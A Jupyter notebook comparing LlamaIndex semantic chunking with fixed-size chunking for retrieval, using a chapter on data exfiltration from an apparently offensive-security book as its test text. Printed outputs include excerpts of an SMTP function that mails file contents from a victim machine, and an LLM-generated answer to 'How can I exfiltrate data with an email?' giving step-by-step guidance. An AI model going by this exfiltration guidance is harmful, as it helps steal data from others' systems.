{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "0c60316d",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Add parent directory to sys.path so we can import wikipedia_downloader.py\n",
    "import sys\n",
    "import os\n",
    "sys.path.append(os.path.abspath(os.path.join(os.getcwd(), '..')))\n",
    "sys.path.append(os.path.abspath(os.getcwd()))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "1c757c58",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "File 'downloads/artificial_intelligence.md' already exists. Skipping download.\n"
     ]
    }
   ],
   "source": [
    "# Import the Wikipedia downloader module\n",
    "from wikipedia_downloader import download_wikipedia_to_markdown, get_page_title_from_url\n",
    "\n",
    "# Example usage: Download a Wikipedia page\n",
    "wikipedia_url = \"https://en.wikipedia.org/wiki/Artificial_intelligence\"\n",
    "output_file = \"downloads/artificial_intelligence.md\"\n",
    "\n",
    "import os\n",
    "\n",
    "if not os.path.exists(output_file):\n",
    "    # Download the page\n",
    "    print (f\"Downloading Wikipedia page from {wikipedia_url} to {output_file}...\")\n",
    "    success = download_wikipedia_to_markdown(wikipedia_url, output_file)\n",
    "    if success:\n",
    "        print(f\"Wikipedia page downloaded successfully!\")\n",
    "        \n",
    "        # Read and display first 500 characters of the downloaded content\n",
    "        with open(output_file, 'r', encoding='utf-8') as f:\n",
    "            content = f.read()\n",
    "            print(f\"\\nFirst 500 characters of the downloaded content:\")\n",
    "            print(content[:500] + \"...\" if len(content) > 500 else content)\n",
    "    else:\n",
    "        print(\"Failed to download Wikipedia page\")\n",
    "else:\n",
    "    print(f\"File '{output_file}' already exists. Skipping download.\")\n",
    "    success = True\n"
   ]
  }, {
   "cell_type": "markdown",
   "id": "593ade06",
   "metadata": {},
   "source": [
    "# Semantic Chunking with LlamaIndex\n",
    "\n",
    "This notebook demonstrates how to use LlamaIndex's semantic chunking to intelligently split PDF documents based on semantic similarity rather than fixed chunk sizes.\n",
    "\n",
    "Semantic chunking adaptively picks breakpoints between sentences using embedding similarity, ensuring chunks contain semantically related content."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "id": "79859b42",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import required libraries\n",
    "import os\n",
    "from llama_index.core import SimpleDirectoryReader, VectorStoreIndex\n",
    "from llama_index.core.node_parser import SentenceSplitter, SemanticSplitterNodeParser\n",
    "from llama_index.embeddings.openai import OpenAIEmbedding"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "id": "b741b887",
   "metadata": {},
   "outputs": [],
   "source": [
    "from dotenv import load_dotenv\n",
    "import os\n",
    "from llama_index.llms.azure_openai import AzureOpenAI\n",
    "from llama_index.embeddings.azure_openai import AzureOpenAIEmbedding\n",
    "\n",
    "load_dotenv()\n",
    "\n",
    "api_key = os.environ.get('OPENAI_API_KEY')\n",
    "azure_endpoint = os.environ.get('OPENAI_API_BASE')\n",
    "deployment_name = os.environ.get('LLAMAINDEX_DEPLOYMENT_NAME')\n",
    "api_version = \"2024-02-15-preview\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "3ab01675",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loaded 1 document(s)\n",
      "Document content preview: 9\n",
      "FUN WITH EXFILTRATION\n",
      "Gaining access to a target network is only \n",
      "a part of the battle. To make use of your \n",
      "access, you want to be able to exfiltrate \n",
      "documents, spreadsheets, or other bits of data \n",
      "from the target system. Depending on the defense \n",
      "mechanisms in place, this last part of your attack can \n",
      "prove to be tricky. There might be local or remote \n",
      "systems (or a combination of both) that work to vali -\n",
      "date processes that open remote connections as well \n",
      "as determine whether those processes should be able \n",
      "to send information or initiate connections outside of \n",
      "the internal network.\n",
      "\n",
      "\n",
      "140   Chapter 9\n",
      "In this chapter, we’ll create tools that enable you to exfiltrate encrypted \n",
      "data. First, we’ll write a script to encrypt and decrypt files. We’ll then use \n",
      "that script to encrypt information and transfer it from the system by using \n",
      "three methods: email, file transfers, and posts to a web server. For each \n",
      "of these methods, we’ll write both a platform-independent tool and a \n",
      "Wind...\n"
     ]
    }
   ],
   "source": [
    "from llama_index.core import Document\n",
    "\n",
    "# file_name = \"C:\\\\temp\\\\blackhatpython2ndedition.pdf\"\n",
    "file_name = \"C:\\\\temp\\\\blackhatpython.pdf\"\n",
    "\n",
    "# Load with default behavior (one doc per page)\n",
    "documents = SimpleDirectoryReader(input_files=[file_name]).load_data()\n",
    "\n",
    "# Combine all pages into one document\n",
    "combined_text = \"\\n\\n\".join([doc.text for doc in documents])\n",
    "combined_document = Document(text=combined_text)\n",
    "\n",
    "# Replace the document list with single combined document\n",
    "documents = [combined_document]\n",
    "\n",
    "print(f\"Loaded {len(documents)} document(s)\")\n",
    "print(f\"Document content preview: {documents[0].text[:1000]}...\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "edbd2e8d",
   "metadata": {},
   "source": [
    "### Key points:\n",
    "\n",
    "No built-in max token/character parameter: The SemanticSplitterNodeParser does not currently expose a parameter to set a hard maximum chunk size in tokens or characters.\n",
    "\n",
    "Known limitation: This is a recognized issue in the LlamaIndex community, and users have reported that chunks exceeding model limits can cause errors during embedding or inference.\n",
    "\n",
    "Workarounds:\n",
    "\n",
    "- Custom subclassing: You can subclass SemanticSplitterNodeParser to add a post-processing step that checks chunk sizes and further splits any that exceed your desired limit. Example approaches and code snippets for this workaround are provided by the community.\n",
    "\n",
    "- Safety net pattern: One common pattern is to use a secondary, simpler splitter (e.g., SentenceSplitter) as a fallback to break up oversized chunks after semantic splitting"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "3797d492",
   "metadata": {},
   "outputs": [],
   "source": [
    "embed_model = AzureOpenAIEmbedding(\n",
    "    model=\"text-embedding-3-small\",\n",
    "    deployment_name=\"text-embedding-3-small\",\n",
    "    api_key=api_key,\n",
    "    azure_endpoint=azure_endpoint,\n",
    "    api_version=api_version,\n",
    ")\n",
    "\n",
    "# Configure semantic splitter\n",
    "splitter = SemanticSplitterNodeParser(\n",
    "    buffer_size=1,  # Number of sentences to group together when evaluating semantic similarity\n",
    "    breakpoint_percentile_threshold=90,  # Percentile threshold for determining breakpoints\n",
    "    embed_model=embed_model\n",
    ")\n",
    "\n",
    "# Create baseline splitter for comparison\n",
    "base_splitter = SentenceSplitter(chunk_size=512)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "id": "0a3d3a00",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "a:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\tqdm\\auto.py:21: TqdmWarning: IProgress not found. Please update jupyter and ipywidgets. See https://ipywidgets.readthedocs.io/en/stable/user_install.html\n",
      "  from .autonotebook import tqdm as notebook_tqdm\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Generating semantic chunks...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Generating embeddings: 100%|██████████| 309/309 [00:14<00:00, 21.30it/s]\n",
      "Parsing nodes: 100%|██████████| 1/1 [00:14<00:00, 14.61s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Generating baseline chunks...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Parsing nodes: 100%|██████████| 1/1 [00:00<00:00, 29.50it/s]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Semantic chunking produced 32 chunks\n",
      "Baseline chunking produced 43 chunks\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    }
   ],
   "source": [
    "# Generate semantic chunks\n",
    "print(\"Generating semantic chunks...\")\n",
    "semantic_nodes = splitter.get_nodes_from_documents(documents, show_progress=True)\n",
    "\n",
    "print(\"Generating baseline chunks...\")\n",
    "baseline_nodes = base_splitter.get_nodes_from_documents(documents, show_progress=True)\n",
    "\n",
    "print(f\"Semantic chunking produced {len(semantic_nodes)} chunks\")\n",
    "print(f\"Baseline chunking produced {len(baseline_nodes)} chunks\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "16db57cc",
   "metadata": {},
   "source": [
    "## Inspecting Semantic Chunks\n",
    "\n",
    "Let's examine the first few chunks created by semantic chunking to see how they group semantically related content."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "id": "5ed1af4b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "=== Semantic Chunk 1 ===\n",
      "Length: 2206 characters\n",
      "Content preview: 9\n",
      "FUN WITH EXFILTRATION\n",
      "Gaining access to a target network is only \n",
      "a part of the battle. To make use of your \n",
      "access, you want to be able to exfiltrate \n",
      "documents, spreadsheets, or other bits of data \n",
      "from the target system. Depending on the defense \n",
      "mechanisms in place, this last part of your attack can \n",
      "prove to be tricky. There might be local or remote \n",
      "systems (or a combination of both) that work to vali -\n",
      "date processes that open remote connections as well \n",
      "as determine whether those processes should be able \n",
      "to send information or initiate connections outside of \n",
      "the internal network.\n",
      "\n",
      "\n",
      "140   Chapter 9\n",
      "In this chapter, we’ll create tools that enable you to exfiltrate encrypted \n",
      "data. First, we’ll write a script to encrypt and decrypt files. We’ll then use \n",
      "that script to encrypt information and transfer it from the system by using \n",
      "three methods: email, file transfers, and posts to a web server. For each \n",
      "of these methods, we’ll write both a platform-independent tool and a \n",
      "Wind...\n",
      "--------------------------------------------------\n",
      "\n",
      "=== Semantic Chunk 2 ===\n",
      "Length: 5313 characters\n",
      "Content preview: It is very fast, and it can handle \n",
      "large amounts of text. That’s the encryption method we will use to encrypt \n",
      "the information we want to exfiltrate.\n",
      "We also import the asymmetric RSA cipher 2, which uses a public key/\n",
      "private key technique. It relies on one key for the encryption (typically the \n",
      "public key) and the other for decryption (typically the private key). We will \n",
      "use this cipher to encrypt the single key used in the AES encryption. The \n",
      "asymmetric encryption is well suited to small bits of information, making it \n",
      "perfect for encrypting the AES key.\n",
      "This method of using both types of encryption is called a hybrid system , \n",
      "and it’s very common. For example, the TLS communication between your \n",
      "browser and a web server involves a hybrid system.\n",
      "\n",
      "Fun with Exfiltration    141\n",
      "Before we can begin encrypting or decrypting, we’ll need to create pub -\n",
      "lic and private keys for the asymmetric RSA encryption. That is, we need to \n",
      "create an RSA key generation function. Let’s start by ad...\n",
      "--------------------------------------------------\n",
      "\n",
      "=== Semantic Chunk 3 ===\n",
      "Length: 973 characters\n",
      "Content preview: To use the SMTP email client, we need to connect to a Simple \n",
      "Mail Transfer Protocol (SMTP) server (an example might be smtp.gmail.com \n",
      "if you have a Gmail account), so we specify the name of the server, the port \n",
      "on which it accepts connections, the account name, and the account pass-\n",
      "word 3. Next, let’s write our platform-independent function plain_email:\n",
      "def plain_email(subject, contents):\n",
      " 1 message = f'Subject: {subject}\\nFrom {smtp_acct}\\n'\n",
      "    message += f'To: {tgt_accts}\\n\\n{contents.decode()}'\n",
      "    server = smtplib.SMTP(smtp_server, smtp_port)\n",
      "    server.starttls()\n",
      " 2 server.login(smtp_acct, smtp_password)\n",
      "    #server.set_debuglevel(1)\n",
      " 3 server.sendmail(smtp_acct, tgt_accts, message)\n",
      "    time.sleep(1)\n",
      "    server.quit()\n",
      "The function takes subject and contents as input and then forms a mes-\n",
      "sage 1 that incorporates the SMTP server data and message contents. The \n",
      "subject will be the name of the file that contained the contents on the vic -\n",
      "tim machine. ...\n",
      "--------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "# Display first few semantic chunks\n",
    "for i, node in enumerate(semantic_nodes[:3]):\n",
    "    print(f\"\\n=== Semantic Chunk {i+1} ===\")\n",
    "    print(f\"Length: {len(node.get_content())} characters\")\n",
    "    print(f\"Content preview: {node.get_content()[:1000]}...\")\n",
    "    print(\"-\" * 50)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c107ebfa",
   "metadata": {},
   "source": [
    "## Comparing with Baseline Chunking\n",
    "\n",
    "Now let's compare the semantic chunks with baseline fixed-size chunks to see the difference in content organization."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "id": "3030722e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "=== Baseline Chunk 1 ===\n",
      "Length: 2205 characters\n",
      "Content preview: 9\n",
      "FUN WITH EXFILTRATION\n",
      "Gaining access to a target network is only \n",
      "a part of the battle. To make use of your \n",
      "access, you want to be able to exfiltrate \n",
      "documents, spreadsheets, or other bits of data \n",
      "from the target system. Depending on the defense \n",
      "mechanisms in place, this last part of your atta...\n",
      "--------------------------------------------------\n",
      "\n",
      "=== Baseline Chunk 2 ===\n",
      "Length: 2085 characters\n",
      "Content preview: Encrypting and Decrypting Files\n",
      "We’ll use the pycryptodomex package for the encryption tasks. You can install \n",
      "it with this command:\n",
      "$ pip install pycryptodomex\n",
      "Now, open up cryptor.py and let’s import the libraries we’ll need to get \n",
      "started:\n",
      "1 from Cryptodome.Cipher import AES, PKCS1_OAEP\n",
      "2 from C...\n",
      "--------------------------------------------------\n",
      "\n",
      "=== Baseline Chunk 3 ===\n",
      "Length: 2054 characters\n",
      "Content preview: For example, the TLS communication between your \n",
      "browser and a web server involves a hybrid system.\n",
      "\n",
      "Fun with Exfiltration    141\n",
      "Before we can begin encrypting or decrypting, we’ll need to create pub -\n",
      "lic and private keys for the asymmetric RSA encryption. That is, we need to \n",
      "create an RSA key ge...\n",
      "--------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "# Display first few baseline chunks for comparison\n",
    "for i, node in enumerate(baseline_nodes[:3]):\n",
    "    print(f\"\\n=== Baseline Chunk {i+1} ===\")\n",
    "    print(f\"Length: {len(node.get_content())} characters\")\n",
    "    print(f\"Content preview: {node.get_content()[:300]}...\")\n",
    "    print(\"-\" * 50)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "id": "d4aeccb0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Chunk Size Statistics:\n",
      "Semantic chunks - Min: 13, Max: 5313, Avg: 1757.2\n",
      "Baseline chunks - Min: 943, Max: 2727, Avg: 1921.7\n"
     ]
    }
   ],
   "source": [
    "# Analyze chunk size distribution\n",
    "semantic_sizes = [len(node.get_content()) for node in semantic_nodes]\n",
    "baseline_sizes = [len(node.get_content()) for node in baseline_nodes]\n",
    "\n",
    "print(\"Chunk Size Statistics:\")\n",
    "print(f\"Semantic chunks - Min: {min(semantic_sizes)}, Max: {max(semantic_sizes)}, Avg: {sum(semantic_sizes)/len(semantic_sizes):.1f}\")\n",
    "print(f\"Baseline chunks - Min: {min(baseline_sizes)}, Max: {max(baseline_sizes)}, Avg: {sum(baseline_sizes)/len(baseline_sizes):.1f}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "da913240",
   "metadata": {},
   "source": [
    "## Setting up Query Engines\n",
    "\n",
    "We'll create query engines for both chunking methods to test their effectiveness in retrieving relevant information."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "id": "292fcdd2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Query engines created successfully!\n"
     ]
    }
   ],
   "source": [
    "from llama_index.core import Settings\n",
    "from llama_index.core.response.notebook_utils import display_source_node\n",
    "\n",
    "# Configure both embedding model and LLM in global settings\n",
    "Settings.embed_model = embed_model\n",
    "\n",
    "llm = AzureOpenAI(\n",
    "    model=\"gpt-4o-mini\",\n",
    "    deployment_name=deployment_name,\n",
    "    api_key=api_key,\n",
    "    azure_endpoint=azure_endpoint,\n",
    "    api_version=api_version,\n",
    "    engine=deployment_name\n",
    ")\n",
    "\n",
    "Settings.llm = llm\n",
    "\n",
    "# Create vector indexes and query engines\n",
    "semantic_index = VectorStoreIndex(semantic_nodes)\n",
    "semantic_query_engine = semantic_index.as_query_engine()\n",
    "\n",
    "baseline_index = VectorStoreIndex(baseline_nodes)\n",
    "baseline_query_engine = baseline_index.as_query_engine()\n",
    "\n",
    "print(\"Query engines created successfully!\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "086bb569",
   "metadata": {},
   "source": [
    "## Testing Queries\n",
    "\n",
    "Let's test both chunking approaches with sample queries to see how they perform."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "071ecdd4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "=== Semantic Chunking Response ===\n",
      "To exfiltrate data via email, you can use a function that connects to an SMTP server. First, you need to import the necessary libraries, such as `smtplib` for email functionality. Set up the SMTP server details, including the server address, port, account name, and password. \n",
      "\n",
      "You can create a function, such as `plain_email`, which takes the subject and contents of the email as inputs. Inside this function, construct the email message by including the subject, sender, and recipient information. Then, establish a connection to the SMTP server, log in with your credentials, and send the email containing the data you wish to exfiltrate. Finally, ensure to close the connection to the server after sending the email.\n",
      "\n",
      "==================================================\n",
      "=== Baseline Chunking Response ===\n",
      "To exfiltrate data via email, you can use a function that connects to an SMTP server. First, you need to specify the SMTP server details, including the server address, port, account name, and password. Then, create a function that constructs an email message with the subject and contents you want to send. The subject can be the name of the file being exfiltrated, while the contents should be the encrypted data.\n",
      "\n",
      "Once the message is prepared, connect to the SMTP server, log in with your account credentials, and use the sendmail method to send the email to the target accounts. After sending the email, ensure to close the connection to the server. This process allows you to securely send exfiltrated data through email.\n"
     ]
    }
   ],
   "source": [
    "# Test query - modify this based on your document content\n",
    "# test_query = \"What are the main topics discussed in this document?\"\n",
    "test_query = \"How can I exfiltrate data with an email?\"\n",
    "\n",
    "print(\"=== Semantic Chunking Response ===\")\n",
    "semantic_response = semantic_query_engine.query(test_query)\n",
    "print(semantic_response)\n",
    "\n",
    "print(\"\\n\" + \"=\"*50)\n",
    "print(\"=== Baseline Chunking Response ===\")\n",
    "baseline_response = baseline_query_engine.query(test_query)\n",
    "print(baseline_response)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "93ac05dd",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "=== Source Nodes (Semantic Chunking) ===\n",
      "\n",
      "Node 1 (Similarity: 0.5509):\n"
     ]
    },
    {
     "data": {
      "text/markdown": [
       "**Node ID:** aea49140-fc08-497b-859b-2e3850391976<br>**Similarity:** 0.5508637623112517<br>**Text:** 150   Chapter 9\n",
       "We pass the exfiltrate function the path to a document and the method \n",
       "of exfiltration we want to use  1. When the method involves a file transfer \n",
       "(transmit or plain_ftp), we need to provide an actual file, not an encoded \n",
       "string. In that case, we read in the file from its source, encrypt the contents, \n",
       "and write a new file into a temporary directory 2. We call the EXFIL diction-\n",
       "ary to dispatch the corresponding method, passing in the new encrypted \n",
       "document path to exfiltra...<br>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Node 2 (Similarity: 0.5189):\n"
     ]
    },
    {
     "data": {
      "text/markdown": [
       "**Node ID:** eed97e66-6e2c-490f-b2ac-38a6964935ae<br>**Similarity:** 0.5188609583743866<br>**Text:** Fun with Exfiltration    143\n",
       "2 import win32com.client\n",
       "3 smtp_server = 'smtp.example.com'\n",
       "smtp_port = 587\n",
       "smtp_acct = 'tim@example.com'\n",
       "smtp_password = 'seKret'\n",
       "tgt_accts = ['tim@elsewhere.com']\n",
       "We import smptlib, which we need for the cross-platform email func -\n",
       "tion 1. We’ll use the win32com package to write our Windows-specific \n",
       "function 2. To use the SMTP email client, we need to connect to a Simple \n",
       "Mail Transfer Protocol (SMTP) server (an example might be smtp.gmail.com \n",
       "if you have a Gm...<br>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Display source nodes for semantic chunking response\n",
    "print(\"=== Source Nodes (Semantic Chunking) ===\")\n",
    "for i, node in enumerate(semantic_response.source_nodes):\n",
    "    print(f\"\\nNode {i+1} (Similarity: {node.score:.4f}):\")\n",
    "    display_source_node(node, source_length=500)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "id": "45026f78",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "=== Source Nodes (Baseline Chunking) ===\n",
      "\n",
      "Node 1 (Similarity: 0.5354):\n"
     ]
    },
    {
     "data": {
      "text/markdown": [
       "**Node ID:** 9d9cddaf-3976-4dc5-b7e4-b0e9f297ad4a<br>**Similarity:** 0.5354182524902213<br>**Text:** Fun with Exfiltration    143\n",
       "2 import win32com.client\n",
       "3 smtp_server = 'smtp.example.com'\n",
       "smtp_port = 587\n",
       "smtp_acct = 'tim@example.com'\n",
       "smtp_password = 'seKret'\n",
       "tgt_accts = ['tim@elsewhere.com']\n",
       "We import smptlib, which we need for the cross-platform email func -\n",
       "tion 1. We’ll use the win32com package to write our Windows-specific \n",
       "function 2. To use the SMTP email client, we need to connect to a Simple \n",
       "Mail Transfer Protocol (SMTP) server (an example might be smtp.gmail.com \n",
       "if you have a Gm...<br>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Node 2 (Similarity: 0.5150):\n"
     ]
    },
    {
     "data": {
      "text/markdown": [
       "**Node ID:** ee793005-ee46-402b-b767-295717e50468<br>**Similarity:** 0.514965630715785<br>**Text:** 150   Chapter 9\n",
       "We pass the exfiltrate function the path to a document and the method \n",
       "of exfiltration we want to use  1. When the method involves a file transfer \n",
       "(transmit or plain_ftp), we need to provide an actual file, not an encoded \n",
       "string. In that case, we read in the file from its source, encrypt the contents, \n",
       "and write a new file into a temporary directory 2. We call the EXFIL diction-\n",
       "ary to dispatch the corresponding method, passing in the new encrypted \n",
       "document path to exfiltra...<br>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Display source nodes for baseline chunking response\n",
    "print(\"=== Source Nodes (Baseline Chunking) ===\")\n",
    "for i, node in enumerate(baseline_response.source_nodes):\n",
    "    print(f\"\\nNode {i+1} (Similarity: {node.score:.4f}):\")\n",
    "    display_source_node(node, source_length=500)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "addb13d2",
   "metadata": {},
   "source": [
    "## Advanced Configuration\n",
    "\n",
    "You can fine-tune the semantic splitter parameters for better results:\n",
    "\n",
    "- `buffer_size`: Number of sentences to group when evaluating similarity\n",
    "- `breakpoint_percentile_threshold`: Higher values create larger, more cohesive chunks\n",
    "- `embed_model`: Different embedding models may produce different chunking results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9ad50e8d",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Example of fine-tuning semantic splitter parameters\n",
    "fine_tuned_splitter = SemanticSplitterNodeParser(\n",
    "    buffer_size=2,  # Group 2 sentences at a time\n",
    "    breakpoint_percentile_threshold=90,  # Lower threshold for more granular chunks\n",
    "    embed_model=embed_model\n",
    ")\n",
    "\n",
    "# Generate chunks with fine-tuned parameters\n",
    "fine_tuned_nodes = fine_tuned_splitter.get_nodes_from_documents(documents)\n",
    "\n",
    "print(f\"Fine-tuned semantic chunking produced {len(fine_tuned_nodes)} chunks\")\n",
    "print(f\"Original semantic chunking produced {len(semantic_nodes)} chunks\")\n",
    "print(f\"Baseline chunking produced {len(baseline_nodes)} chunks\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1dd51ec4",
   "metadata": {},
   "source": [
    "## Summary\n",
    "\n",
    "Semantic chunking offers several advantages over fixed-size chunking:\n",
    "\n",
    "1. **Content Coherence**: Chunks contain semantically related sentences\n",
    "2. **Adaptive Size**: Chunk sizes vary based on content structure\n",
    "3. **Better Retrieval**: More relevant chunks for specific queries\n",
    "4. **Context Preservation**: Related information stays together\n",
    "\n",
    "Use semantic chunking when you need more intelligent document segmentation for RAG applications."
   ]
  }

 ],
 "metadata": {
  "kernelspec": {
   "display_name": "ainotebooks",
   "language": "python",
   "name": "ainotebooks"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
